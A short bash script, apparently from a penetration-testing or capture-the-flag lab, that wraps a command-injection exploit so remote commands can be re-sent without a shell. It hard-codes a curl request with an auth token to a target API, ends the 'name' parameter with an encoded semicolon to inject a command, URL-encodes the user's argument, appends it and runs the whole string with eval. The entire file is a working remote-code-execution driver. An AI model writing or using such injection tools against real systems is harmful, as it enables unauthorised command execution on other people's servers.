#! /bin/bash

#Tool to keep terminal clean while repeatedly running long commands with small changes
#built for when you have remote RCE but not a shell yet


#$RCE is the base command, edit it to your liking
#the first argument is appended to the end of $RCE before execution
RCE="curl -s --header \"auth-token:eyJh9NzRtaW4iLLnd1OOUSODIMKumSE\" http://10.10.10.10/api/logs?name=private.js%3B"


#Magic code from stackoverflow
#https://stackoverflow.com/questions/296536/how-to-urlencode-data-for-curl-command
url_encode() {
   awk 'BEGIN {
      for (n = 0; n < 125; n++) {
         m[sprintf("%c", n)] = n
      }
      n = 1
      while (1) {
         s = substr(ARGV[1], n, 1)
         if (s == "") {
            break
         }
         t = s ~ /[[:alnum:]_.!~*\47()-]/ ? t s : t sprintf("%%%02X", m[s])
         n++
      }
      print t
   }' "$1"
}

#Calc full command and execute
FULL=$RCE$(url_encode "$1")
eval $FULL | xargs -0 printf

#Sometimes a new line is not returned
echo
